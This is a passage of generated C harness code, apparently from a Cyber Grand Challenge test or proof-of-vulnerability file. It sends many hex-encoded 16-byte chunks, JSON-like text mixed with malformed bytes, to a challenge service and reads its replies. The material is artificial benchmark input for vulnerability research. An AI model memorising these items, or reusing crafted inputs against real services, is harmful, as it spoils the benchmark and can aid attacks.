      cgc_free(read_00097);
      if (read_00097_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00097_00000[] = 
         "\x68\x42\x72\x56\x56\x58\x22\x2c\x20\x22\x48\x34\x42\x57\x45\x5d";
      static unsigned int write_00097_00000_len = 16;
      unsigned char *write_00097 = NULL;
      unsigned int write_00097_len = 0;
      write_00097 = cgc_append_buf(write_00097, &write_00097_len, write_00097_00000, write_00097_00000_len);
      if (write_00097_len > 0) {
         cgc_transmit_all(1, write_00097, write_00097_len);
      }
      cgc_free(write_00097);
   } while (0);
   do {
      unsigned char *read_00098;
      unsigned int read_00098_len;
      unsigned int read_00098_ptr = 0;
      //**** length read
      read_00098_len = 25;
      read_00098 = (unsigned char*)cgc_malloc(read_00098_len);
      int read_00098_res = cgc_length_read(0, read_00098, read_00098_len);
      if (read_00098_res) {} //silence unused variable warning
      cgc_free(read_00098);
      if (read_00098_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00098_00000[] = 
         "\x79\x66\x67\x73\x70\x70\x62\x70\x67\x79\x6f\x4c\x4b\x80\x4b\x62";
      static unsigned int write_00098_00000_len = 16;
      unsigned char *write_00098 = NULL;
      unsigned int write_00098_len = 0;
      write_00098 = cgc_append_buf(write_00098, &write_00098_len, write_00098_00000, write_00098_00000_len);
      if (write_00098_len > 0) {
         cgc_transmit_all(1, write_00098, write_00098_len);
      }
      cgc_free(write_00098);
   } while (0);
   do {
      unsigned char *read_00099;
      unsigned int read_00099_len;
      unsigned int read_00099_ptr = 0;
      //**** length read
      read_00099_len = 25;
      read_00099 = (unsigned char*)cgc_malloc(read_00099_len);
      int read_00099_res = cgc_length_read(0, read_00099, read_00099_len);
      if (read_00099_res) {} //silence unused variable warning
      cgc_free(read_00099);
      if (read_00099_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00099_00000[] = 
         "\x4e\x64\x50\x63\x77\x77\x48\x56\x56\x67\x59\x58\x6b\x2d\x6c\x59";
      static unsigned int write_00099_00000_len = 16;
      unsigned char *write_00099 = NULL;
      unsigned int write_00099_len = 0;
      write_00099 = cgc_append_buf(write_00099, &write_00099_len, write_00099_00000, write_00099_00000_len);
      if (write_00099_len > 0) {
         cgc_transmit_all(1, write_00099, write_00099_len);
      }
      cgc_free(write_00099);
   } while (0);
   do {
      unsigned char *read_00100;
      unsigned int read_00100_len;
      unsigned int read_00100_ptr = 0;
      //**** length read
      read_00100_len = 25;
      read_00100 = (unsigned char*)cgc_malloc(read_00100_len);
      int read_00100_res = cgc_length_read(0, read_00100, read_00100_len);
      if (read_00100_res) {} //silence unused variable warning
      cgc_free(read_00100);
      if (read_00100_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00100_00000[] = 
         "\x6c\x78\x59\x61\x6b\x6a\x52\x73\x76\x47\x68\x49\x51\x48\x50\x70";
      static unsigned int write_00100_00000_len = 16;
      unsigned char *write_00100 = NULL;
      unsigned int write_00100_len = 0;
      write_00100 = cgc_append_buf(write_00100, &write_00100_len, write_00100_00000, write_00100_00000_len);
      if (write_00100_len > 0) {
         cgc_transmit_all(1, write_00100, write_00100_len);
      }
      cgc_free(write_00100);
   } while (0);
   do {
      unsigned char *read_00101;
      unsigned int read_00101_len;
      unsigned int read_00101_ptr = 0;
      //**** length read
      read_00101_len = 25;
      read_00101 = (unsigned char*)cgc_malloc(read_00101_len);
      int read_00101_res = cgc_length_read(0, read_00101, read_00101_len);
      if (read_00101_res) {} //silence unused variable warning
      cgc_free(read_00101);
      if (read_00101_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00101_00000[] = 
         "\x76\x10\x65\x48\x6b\x6e\x7a\x73\x55\x56\x66\x4c\x56\x62\x78\x55";
      static unsigned int write_00101_00000_len = 16;
      unsigned char *write_00101 = NULL;
      unsigned int write_00101_len = 0;
      write_00101 = cgc_append_buf(write_00101, &write_00101_len, write_00101_00000, write_00101_00000_len);
      if (write_00101_len > 0) {
         cgc_transmit_all(1, write_00101, write_00101_len);
      }
      cgc_free(write_00101);
   } while (0);
   do {
      unsigned char *read_00102;
      unsigned int read_00102_len;
      unsigned int read_00102_ptr = 0;
      //**** length read
      read_00102_len = 25;
      read_00102 = (unsigned char*)cgc_malloc(read_00102_len);
      int read_00102_res = cgc_length_read(0, read_00102, read_00102_len);
      if (read_00102_res) {} //silence unused variable warning
      cgc_free(read_00102);
      if (read_00102_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00102_00000[] = 
         "\x72\x46\x43\x68\x22\x3a\x20\x2d\x30\x2e\x39\x4e\x2c\x20\x22\x5a";
      static unsigned int write_00102_00000_len = 16;
      unsigned char *write_00102 = NULL;
      unsigned int write_00102_len = 0;
      write_00102 = cgc_append_buf(write_00102, &write_00102_len, write_00102_00000, write_00102_00000_len);
      if (write_00102_len > 0) {
         cgc_transmit_all(1, write_00102, write_00102_len);
      }
      cgc_free(write_00102);
   } while (0);
   do {
      unsigned char *read_00103;
      unsigned int read_00103_len;
      unsigned int read_00103_ptr = 0;
      //**** length read
      read_00103_len = 25;
      read_00103 = (unsigned char*)cgc_malloc(read_00103_len);
      int read_00103_res = cgc_length_read(0, read_00103, read_00103_len);
      if (read_00103_res) {} //silence unused variable warning
      cgc_free(read_00103);
      if (read_00103_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00103_00000[] = 
         "\x57\x47\x45\x48\x63\x6d\x6d\x6c\x69\x73\x57\x50\x4e\x6a\x62\x59";
      static unsigned int write_00103_00000_len = 16;
      unsigned char *write_00103 = NULL;
      unsigned int write_00103_len = 0;
      write_00103 = cgc_append_buf(write_00103, &write_00103_len, write_00103_00000, write_00103_00000_len);
      if (write_00103_len > 0) {
         cgc_transmit_all(1, write_00103, write_00103_len);
      }
      cgc_free(write_00103);
   } while (0);
   do {
      unsigned char *read_00104;
      unsigned int read_00104_len;
      unsigned int read_00104_ptr = 0;
      //**** length read
      read_00104_len = 25;
      read_00104 = (unsigned char*)cgc_malloc(read_00104_len);
      int read_00104_res = cgc_length_read(0, read_00104, read_00104_len);
      if (read_00104_res) {} //silence unused variable warning
      cgc_free(read_00104);
      if (read_00104_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00104_00000[] = 
         "\x79\x59\x63\x53\x22\x2c\x20\x22\x6e\x79\x61\x65\x7a\x6b\x58\x7a";
      static unsigned int write_00104_00000_len = 16;
      unsigned char *write_00104 = NULL;
      unsigned int write_00104_len = 0;
      write_00104 = cgc_append_buf(write_00104, &write_00104_len, write_00104_00000, write_00104_00000_len);
      if (write_00104_len > 0) {
         cgc_transmit_all(1, write_00104, write_00104_len);
      }
      cgc_free(write_00104);
   } while (0);
   do {
      unsigned char *read_00105;
      unsigned int read_00105_len;
      unsigned int read_00105_ptr = 0;
      //**** length read
      read_00105_len = 25;
      read_00105 = (unsigned char*)cgc_malloc(read_00105_len);
      int read_00105_res = cgc_length_read(0, read_00105, read_00105_len);
      if (read_00105_res) {} //silence unused variable warning
      cgc_free(read_00105);
      if (read_00105_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00105_00000[] = 
         "\x62\x52\x49\x48\x6c\x67\x6f\x62\x41\x71\x4e\x6e\x72\x5a\x55\x63";
      static unsigned int write_00105_00000_len = 16;
      unsigned char *write_00105 = NULL;
      unsigned int write_00105_len = 0;
      write_00105 = cgc_append_buf(write_00105, &write_00105_len, write_00105_00000, write_00105_00000_len);
      if (write_00105_len > 0) {
         cgc_transmit_all(1, write_00105, write_00105_len);
      }
      cgc_free(write_00105);
   } while (0);
   do {
      unsigned char *read_00106;
      unsigned int read_00106_len;
      unsigned int read_00106_ptr = 0;
      //**** length read
      read_00106_len = 25;
      read_00106 = (unsigned char*)cgc_malloc(read_00106_len);
      int read_00106_res = cgc_length_read(0, read_00106, read_00106_len);
      if (read_00106_res) {} //silence unused variable warning
      cgc_free(read_00106);
      if (read_00106_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00106_00000[] = 
         "\x69\x6b\x6a\x6d\x72\x45\x6d\x4e\x47\x20\x35\x33\x35\x38\x38\x33";
      static unsigned int write_00106_00000_len = 16;
      unsigned char *write_00106 = NULL;
      unsigned int write_00106_len = 0;
      write_00106 = cgc_append_buf(write_00106, &write_00106_len, write_00106_00000, write_00106_00000_len);
      if (write_00106_len > 0) {
         cgc_transmit_all(1, write_00106, write_00106_len);
      }
      cgc_free(write_00106);
   } while (0);
   do {
      unsigned char *read_00107;
      unsigned int read_00107_len;
      unsigned int read_00107_ptr = 0;
      //**** length read
      read_00107_len = 25;
      read_00107 = (unsigned char*)cgc_malloc(read_00107_len);
      int read_00107_res = cgc_length_read(0, read_00107, read_00107_len);
      if (read_00107_res) {} //silence unused variable warning
      cgc_free(read_00107);
      if (read_00107_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00107_00000[] = 
         "\x30\x31\x39\x2c\x20\x22\x4b\x74\x72\x6e\x48\x68\x71\x77\x65\x6d";
      static unsigned int write_00107_00000_len = 16;
      unsigned char *write_00107 = NULL;
      unsigned int write_00107_len = 0;
      write_00107 = cgc_append_buf(write_00107, &write_00107_len, write_00107_00000, write_00107_00000_len);
      if (write_00107_len > 0) {
         cgc_transmit_all(1, write_00107, write_00107_len);
      }
      cgc_free(write_00107);
   } while (0);
   do {
      unsigned char *read_00108;
      unsigned int read_00108_len;
      unsigned int read_00108_ptr = 0;
      //**** length read
      read_00108_len = 25;
      read_00108 = (unsigned char*)cgc_malloc(read_00108_len);
      int read_00108_res = cgc_length_read(0, read_00108, read_00108_len);
      if (read_00108_res) {} //silence unused variable warning
      cgc_free(read_00108);
      if (read_00108_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00108_00000[] = 
         "\x4e\x48\x74\x57\x44\x77\x34\x6e\x4e\x22\x3a\x20\x2d\x35\x31\x36";
      static unsigned int write_00108_00000_len = 16;
      unsigned char *write_00108 = NULL;
      unsigned int write_00108_len = 0;
      write_00108 = cgc_append_buf(write_00108, &write_00108_len, write_00108_00000, write_00108_00000_len);
      if (write_00108_len > 0) {
         cgc_transmit_all(1, write_00108, write_00108_len);
      }
      cgc_free(write_00108);
   } while (0);
   do {
      unsigned char *read_00109;
      unsigned int read_00109_len;
      unsigned int read_00109_ptr = 0;
      //**** length read
      read_00109_len = 25;
      read_00109 = (unsigned char*)cgc_malloc(read_00109_len);
      int read_00109_res = cgc_length_read(0, read_00109, read_00109_len);
      if (read_00109_res) {} //silence unused variable warning
      cgc_free(read_00109);
      if (read_00109_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00109_00000[] = 
         "\x33\x32\x39\x38\x39\x38\x1d\x20\x22\x6f\x47\x77\x4a\x49\x45\x47";
      static unsigned int write_00109_00000_len = 16;
      unsigned char *write_00109 = NULL;
      unsigned int write_00109_len = 0;
      write_00109 = cgc_append_buf(write_00109, &write_00109_len, write_00109_00000, write_00109_00000_len);
      if (write_00109_len > 0) {
         cgc_transmit_all(1, write_00109, write_00109_len);
      }
      cgc_free(write_00109);
   } while (0);
   do {
      unsigned char *read_00110;
      unsigned int read_00110_len;
      unsigned int read_00110_ptr = 0;
      //**** length read
      read_00110_len = 25;
      read_00110 = (unsigned char*)cgc_malloc(read_00110_len);
      int read_00110_res = cgc_length_read(0, read_00110, read_00110_len);
      if (read_00110_res) {} //silence unused variable warning
      cgc_free(read_00110);
      if (read_00110_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00110_00000[] = 
         "\x4f\x73\x51\x58\x4c\x50\x6f\x4e\x49\x4d\x69\x61\x77\x78\x7a\x4a";
      static unsigned int write_00110_00000_len = 16;
      unsigned char *write_00110 = NULL;
      unsigned int write_00110_len = 0;
      write_00110 = cgc_append_buf(write_00110, &write_00110_len, write_00110_00000, write_00110_00000_len);
      if (write_00110_len > 0) {
         cgc_transmit_all(1, write_00110, write_00110_len);
      }
      cgc_free(write_00110);
   } while (0);
   do {
      unsigned char *read_00111;
      unsigned int read_00111_len;
      unsigned int read_00111_ptr = 0;
      //**** length read
      read_00111_len = 25;
      read_00111 = (unsigned char*)cgc_malloc(read_00111_len);
      int read_00111_res = cgc_length_read(0, read_00111, read_00111_len);
      if (read_00111_res) {} //silence unused variable warning
      cgc_free(read_00111);
      if (read_00111_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00111_00000[] = 
         "\x59\x41\x77\x68\x43\x6c\x74\x50\x6b\x4d\x63\x6a\x61\x63\x6e\x22";
      static unsigned int write_00111_00000_len = 16;
      unsigned char *write_00111 = NULL;
      unsigned int write_00111_len = 0;
      write_00111 = cgc_append_buf(write_00111, &write_00111_len, write_00111_00000, write_00111_00000_len);
      if (write_00111_len > 0) {
         cgc_transmit_all(1, write_00111, write_00111_len);
      }
      cgc_free(write_00111);
   } while (0);
   do {
      unsigned char *read_00112;
      unsigned int read_00112_len;
      unsigned int read_00112_ptr = 0;
      //**** length read
      read_00112_len = 25;
      read_00112 = (unsigned char*)cgc_malloc(read_00112_len);
      int read_00112_res = cgc_length_read(0, read_00112, read_00112_len);
      if (read_00112_res) {} //silence unused variable warning
      cgc_free(read_00112);
      if (read_00112_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00112_00000[] = 
         "\x3a\x20\x2d\x31\x35\x30\x35\x32\x33\x36\x34\x30\x31\x2c\x20\x22";
      static unsigned int write_00112_00000_len = 16;
      unsigned char *write_00112 = NULL;
      unsigned int write_00112_len = 0;
      write_00112 = cgc_append_buf(write_00112, &write_00112_len, write_00112_00000, write_00112_00000_len);
      if (write_00112_len > 0) {
         cgc_transmit_all(1, write_00112, write_00112_len);
      }
      cgc_free(write_00112);
   } while (0);
   do {
      unsigned char *read_00113;
      unsigned int read_00113_len;
      unsigned int read_00113_ptr = 0;
      //**** length read
      read_00113_len = 25;
      read_00113 = (unsigned char*)cgc_malloc(read_00113_len);
      int read_00113_res = cgc_length_read(0, read_00113, read_00113_len);
      if (read_00113_res) {} //silence unused variable warning
      cgc_free(read_00113);
      if (read_00113_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00113_00000[] = 
         "\x50\x6b\x69\x58\x79\x54\x65\x66\x49\x63\x55\x41\x57\x56\xec\x57";
      static unsigned int write_00113_00000_len = 16;
      unsigned char *write_00113 = NULL;
      unsigned int write_00113_len = 0;
      write_00113 = cgc_append_buf(write_00113, &write_00113_len, write_00113_00000, write_00113_00000_len);
      if (write_00113_len > 0) {
         cgc_transmit_all(1, write_00113, write_00113_len);
      }
      cgc_free(write_00113);
   } while (0);
   do {
      unsigned char *read_00114;
      unsigned int read_00114_len;
      unsigned int read_00114_ptr = 0;
      //**** length read
      read_00114_len = 25;
      read_00114 = (unsigned char*)cgc_malloc(read_00114_len);
      int read_00114_res = cgc_length_read(0, read_00114, read_00114_len);
      if (read_00114_res) {} //silence unused variable warning
      cgc_free(read_00114);
      if (read_00114_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00114_00000[] = 
         "\x79\x22\x22\x6e\x41\x44\x6b\x77\x94\x59\x4d\x54\x52\x58\x68\x6f";
      static unsigned int write_00114_00000_len = 16;
      unsigned char *write_00114 = NULL;
      unsigned int write_00114_len = 0;
      write_00114 = cgc_append_buf(write_00114, &write_00114_len, write_00114_00000, write_00114_00000_len);
      if (write_00114_len > 0) {
         cgc_transmit_all(1, write_00114, write_00114_len);
      }
      cgc_free(write_00114);
   } while (0);
   do {
      unsigned char *read_00115;
      unsigned int read_00115_len;
      unsigned int read_00115_ptr = 0;
      //**** length read
      read_00115_len = 25;
      read_00115 = (unsigned char*)cgc_malloc(read_00115_len);
      int read_00115_res = cgc_length_read(0, read_00115, read_00115_len);
      if (read_00115_res) {} //silence unused variable warning
      cgc_free(read_00115);
      if (read_00115_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00115_00000[] = 
         "\x4b\x55\x61\x46\x68\x4d\x53\x73\x69\x53\x7a\x69\x64\xff\x7f\x7a";
      static unsigned int write_00115_00000_len = 16;
      unsigned char *write_00115 = NULL;
      unsigned int write_00115_len = 0;
      write_00115 = cgc_append_buf(write_00115, &write_00115_len, write_00115_00000, write_00115_00000_len);
      if (write_00115_len > 0) {
         cgc_transmit_all(1, write_00115, write_00115_len);
      }
      cgc_free(write_00115);
   } while (0);
   do {
      unsigned char *read_00116;
      unsigned int read_00116_len;
      unsigned int read_00116_ptr = 0;
      //**** length read
      read_00116_len = 25;
      read_00116 = (unsigned char*)cgc_malloc(read_00116_len);
      int read_00116_res = cgc_length_read(0, read_00116, read_00116_len);
      if (read_00116_res) {} //silence unused variable warning
      cgc_free(read_00116);
      if (read_00116_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00116_00000[] = 
         "\x59\x4c\x44\x84\x44\x73\x6c\x48\x4e\x42\x66\x65\x4c\x76\x78\x66";
      static unsigned int write_00116_00000_len = 16;
      unsigned char *write_00116 = NULL;
      unsigned int write_00116_len = 0;
      write_00116 = cgc_append_buf(write_00116, &write_00116_len, write_00116_00000, write_00116_00000_len);
      if (write_00116_len > 0) {
         cgc_transmit_all(1, write_00116, write_00116_len);
      }
      cgc_free(write_00116);
   } while (0);
   do {
      unsigned char *read_00117;
      unsigned int read_00117_len;
      unsigned int read_00117_ptr = 0;
      //**** length read
      read_00117_len = 25;
      read_00117 = (unsigned char*)cgc_malloc(read_00117_len);
      int read_00117_res = cgc_length_read(0, read_00117, read_00117_len);
      if (read_00117_res) {} //silence unused variable warning
      cgc_free(read_00117);
      if (read_00117_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00117_00000[] = 
         "\x68\x74\x7a\x75\x6d\x4b\x71\x77\x49\x55\x59\x51\x70\x48\x76\x4e";
      static unsigned int write_00117_00000_len = 16;
      unsigned char *write_00117 = NULL;
      unsigned int write_00117_len = 0;
      write_00117 = cgc_append_buf(write_00117, &write_00117_len, write_00117_00000, write_00117_00000_len);
      if (write_00117_len > 0) {
         cgc_transmit_all(1, write_00117, write_00117_len);
      }
      cgc_free(write_00117);
   } while (0);
   do {
      unsigned char *read_00118;
      unsigned int read_00118_len;
      unsigned int read_00118_ptr = 0;
      //**** length read
      read_00118_len = 25;
      read_00118 = (unsigned char*)cgc_malloc(read_00118_len);
      int read_00118_res = cgc_length_read(0, read_00118, read_00118_len);
      if (read_00118_res) {} //silence unused variable warning
      cgc_free(read_00118);
      if (read_00118_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00118_00000[] = 
         "\x79\x62\x7a\x70\x69\x22\x3a\x20\x67\x5a\x6c\x45\x4a\x43\x4b\x67";
      static unsigned int write_00118_00000_len = 16;
      unsigned char *write_00118 = NULL;
      unsigned int write_00118_len = 0;
      write_00118 = cgc_append_buf(write_00118, &write_00118_len, write_00118_00000, write_00118_00000_len);
      if (write_00118_len > 0) {
         cgc_transmit_all(1, write_00118, write_00118_len);
      }
      cgc_free(write_00118);
   } while (0);
   do {
      unsigned char *read_00119;
      unsigned int read_00119_len;
      unsigned int read_00119_ptr = 0;
      //**** length read
      read_00119_len = 25;
      read_00119 = (unsigned char*)cgc_malloc(read_00119_len);
      int read_00119_res = cgc_length_read(0, read_00119, read_00119_len);
      if (read_00119_res) {} //silence unused variable warning
      cgc_free(read_00119);
      if (read_00119_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00119_00000[] = 
         "\x6d\x4d\x79\x71\x55\x58\x4d\x6b\x76\x4d\x7a\x70\x47\x53\x72\x56";
      static unsigned int write_00119_00000_len = 16;
      unsigned char *write_00119 = NULL;
      unsigned int write_00119_len = 0;
      write_00119 = cgc_append_buf(write_00119, &write_00119_len, write_00119_00000, write_00119_00000_len);
      if (write_00119_len > 0) {
         cgc_transmit_all(1, write_00119, write_00119_len);
      }
      cgc_free(write_00119);
   } while (0);
   do {
      unsigned char *read_00120;
      unsigned int read_00120_len;
      unsigned int read_00120_ptr = 0;
      //**** length read
      read_00120_len = 25;
      read_00120 = (unsigned char*)cgc_malloc(read_00120_len);
      int read_00120_res = cgc_length_read(0, read_00120, read_00120_len);
      if (read_00120_res) {} //silence unused variable warning
      cgc_free(read_00120);
      if (read_00120_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00120_00000[] = 
         "\x57\x68\x79\x52\x6b\x6f\x43\x6c\x56\x3d\x4d\x46\x7a\x66\x71\x4b";
      static unsigned int write_00120_00000_len = 16;
      unsigned char *write_00120 = NULL;
      unsigned int write_00120_len = 0;
      write_00120 = cgc_append_buf(write_00120, &write_00120_len, write_00120_00000, write_00120_00000_len);
      if (write_00120_len > 0) {
         cgc_transmit_all(1, write_00120, write_00120_len);
      }
      cgc_free(write_00120);
   } while (0);
   do {
      unsigned char *read_00121;
      unsigned int read_00121_len;
      unsigned int read_00121_ptr = 0;
      //**** length read
      read_00121_len = 25;
      read_00121 = (unsigned char*)cgc_malloc(read_00121_len);
      int read_00121_res = cgc_length_read(0, read_00121, read_00121_len);
      if (read_00121_res) {} //silence unused variable warning
      cgc_free(read_00121);
      if (read_00121_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00121_00000[] = 
         "\x55\x70\x6b\x63\x6d\x42\x7a\x4c\x51\x86\x86\x86\x86\x86\x86\x86";
      static unsigned int write_00121_00000_len = 16;
      unsigned char *write_00121 = NULL;
      unsigned int write_00121_len = 0;
      write_00121 = cgc_append_buf(write_00121, &write_00121_len, write_00121_00000, write_00121_00000_len);
      if (write_00121_len > 0) {
         cgc_transmit_all(1, write_00121, write_00121_len);
      }
      cgc_free(write_00121);
   } while (0);
   do {
      unsigned char *read_00122;
      unsigned int read_00122_len;
      unsigned int read_00122_ptr = 0;
      //**** length read
      read_00122_len = 25;
      read_00122 = (unsigned char*)cgc_malloc(read_00122_len);
      int read_00122_res = cgc_length_read(0, read_00122, read_00122_len);
      if (read_00122_res) {} //silence unused variable warning
      cgc_free(read_00122);
      if (read_00122_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00122_00000[] = 
         "\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x3a\x20\x22\x57";
      static unsigned int write_00122_00000_len = 16;
      unsigned char *write_00122 = NULL;
      unsigned int write_00122_len = 0;
      write_00122 = cgc_append_buf(write_00122, &write_00122_len, write_00122_00000, write_00122_00000_len);
      if (write_00122_len > 0) {
         cgc_transmit_all(1, write_00122, write_00122_len);
      }
      cgc_free(write_00122);
   } while (0);
   do {
      unsigned char *read_00123;
      unsigned int read_00123_len;
      unsigned int read_00123_ptr = 0;
      //**** length read
      read_00123_len = 25;
      read_00123 = (unsigned char*)cgc_malloc(read_00123_len);
      int read_00123_res = cgc_length_read(0, read_00123, read_00123_len);
      if (read_00123_res) {} //silence unused variable warning
      cgc_free(read_00123);
      if (read_00123_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00123_00000[] = 
         "\x45\x4a\x57\x6b\x71\x65\x66\x36\x37\x30\x35\x38\x31\x37\x2c\x00";
      static unsigned int write_00123_00000_len = 16;
      unsigned char *write_00123 = NULL;
      unsigned int write_00123_len = 0;
      write_00123 = cgc_append_buf(write_00123, &write_00123_len, write_00123_00000, write_00123_00000_len);
      if (write_00123_len > 0) {
         cgc_transmit_all(1, write_00123, write_00123_len);
      }
      cgc_free(write_00123);
   } while (0);
   do {
      unsigned char *read_00124;
      unsigned int read_00124_len;
      unsigned int read_00124_ptr = 0;
      //**** length read
      read_00124_len = 25;
      read_00124 = (unsigned char*)cgc_malloc(read_00124_len);
      int read_00124_res = cgc_length_read(0, read_00124, read_00124_len);
      if (read_00124_res) {} //silence unused variable warning
      cgc_free(read_00124);
      if (read_00124_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00124_00000[] = 
         "\x40\x22\x59\x56\x47\x74\x58\x58\x59\x4b\x4f\x6a\x69\x70\x4e\x43";
      static unsigned int write_00124_00000_len = 16;
      unsigned char *write_00124 = NULL;
      unsigned int write_00124_len = 0;
      write_00124 = cgc_append_buf(write_00124, &write_00124_len, write_00124_00000, write_00124_00000_len);
      if (write_00124_len > 0) {
         cgc_transmit_all(1, write_00124, write_00124_len);
      }
      cgc_free(write_00124);
   } while (0);
   do {
      unsigned char *read_00125;
      unsigned int read_00125_len;
      unsigned int read_00125_ptr = 0;
      //**** length read
      read_00125_len = 25;
      read_00125 = (unsigned char*)cgc_malloc(read_00125_len);
      int read_00125_res = cgc_length_read(0, read_00125, read_00125_len);
      if (read_00125_res) {} //silence unused variable warning
      cgc_free(read_00125);
      if (read_00125_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00125_00000[] = 
         "\x64\x57\x73\x4b\x53\x63\x67\x67\x6d\x55\x58\x41\x46\x58\x47\x73";
      static unsigned int write_00125_00000_len = 16;
      unsigned char *write_00125 = NULL;
      unsigned int write_00125_len = 0;
      write_00125 = cgc_append_buf(write_00125, &write_00125_len, write_00125_00000, write_00125_00000_len);
      if (write_00125_len > 0) {
         cgc_transmit_all(1, write_00125, write_00125_len);
      }
      cgc_free(write_00125);
   } while (0);
   do {
      unsigned char *read_00126;
      unsigned int read_00126_len;
      unsigned int read_00126_ptr = 0;
      //**** length read
      read_00126_len = 25;
      read_00126 = (unsigned char*)cgc_malloc(read_00126_len);
      int read_00126_res = cgc_length_read(0, read_00126, read_00126_len);
      if (read_00126_res) {} //silence unused variable warning
      cgc_free(read_00126);
      if (read_00126_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00126_00000[] = 
         "\x74\x7a\x78\x5a\x6a\x6e\x6f\x51\x78\x6c\x4c\x75\x54\x41\x49\x62";
      static unsigned int write_00126_00000_len = 16;
      unsigned char *write_00126 = NULL;
      unsigned int write_00126_len = 0;
      write_00126 = cgc_append_buf(write_00126, &write_00126_len, write_00126_00000, write_00126_00000_len);
      if (write_00126_len > 0) {
         cgc_transmit_all(1, write_00126, write_00126_len);
      }
      cgc_free(write_00126);
   } while (0);
   do {
      unsigned char *read_00127;
      unsigned int read_00127_len;
      unsigned int read_00127_ptr = 0;
      //**** length read
      read_00127_len = 25;
      read_00127 = (unsigned char*)cgc_malloc(read_00127_len);
      int read_00127_res = cgc_length_read(0, read_00127, read_00127_len);
      if (read_00127_res) {} //silence unused variable warning
      cgc_free(read_00127);
      if (read_00127_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00127_00000[] = 
         "\x66\x69\x66\x69\x4d\x74\x78\x48\x41\x54\x44\x75\x49\x70\x48\x77";
      static unsigned int write_00127_00000_len = 16;
      unsigned char *write_00127 = NULL;
      unsigned int write_00127_len = 0;
      write_00127 = cgc_append_buf(write_00127, &write_00127_len, write_00127_00000, write_00127_00000_len);
      if (write_00127_len > 0) {
         cgc_transmit_all(1, write_00127, write_00127_len);
      }
      cgc_free(write_00127);
   } while (0);
   do {
      unsigned char *read_00128;
      unsigned int read_00128_len;
      unsigned int read_00128_ptr = 0;
      //**** length read
      read_00128_len = 25;
      read_00128 = (unsigned char*)cgc_malloc(read_00128_len);
      int read_00128_res = cgc_length_read(0, read_00128, read_00128_len);
      if (read_00128_res) {} //silence unused variable warning
      cgc_free(read_00128);
      if (read_00128_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00128_00000[] = 
         "\x53\x2f\x44\x55\x6a\x6e\x55\x79\x4c\x59\x63\x53\x22\x2c\x20\x22";
      static unsigned int write_00128_00000_len = 16;
      unsigned char *write_00128 = NULL;
      unsigned int write_00128_len = 0;
      write_00128 = cgc_append_buf(write_00128, &write_00128_len, write_00128_00000, write_00128_00000_len);
      if (write_00128_len > 0) {
         cgc_transmit_all(1, write_00128, write_00128_len);
      }
      cgc_free(write_00128);
   } while (0);
   do {
      unsigned char *read_00129;
      unsigned int read_00129_len;
      unsigned int read_00129_ptr = 0;
      //**** length read
      read_00129_len = 25;
      read_00129 = (unsigned char*)cgc_malloc(read_00129_len);
      int read_00129_res = cgc_length_read(0, read_00129, read_00129_len);
      if (read_00129_res) {} //silence unused variable warning
      cgc_free(read_00129);
      if (read_00129_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00129_00000[] = 
         "\x6e\x79\x61\x6e\x5f\x73\x61\x79\x73\x22\x3a\x20\x22\x57\x51\x7a";
      static unsigned int write_00129_00000_len = 16;
      unsigned char *write_00129 = NULL;
      unsigned int write_00129_len = 0;
      write_00129 = cgc_append_buf(write_00129, &write_00129_len, write_00129_00000, write_00129_00000_len);
      if (write_00129_len > 0) {
         cgc_transmit_all(1, write_00129, write_00129_len);
      }
      cgc_free(write_00129);
   } while (0);
   do {
      unsigned char *read_00130;
      unsigned int read_00130_len;
      unsigned int read_00130_ptr = 0;
      //**** length read
      read_00130_len = 25;
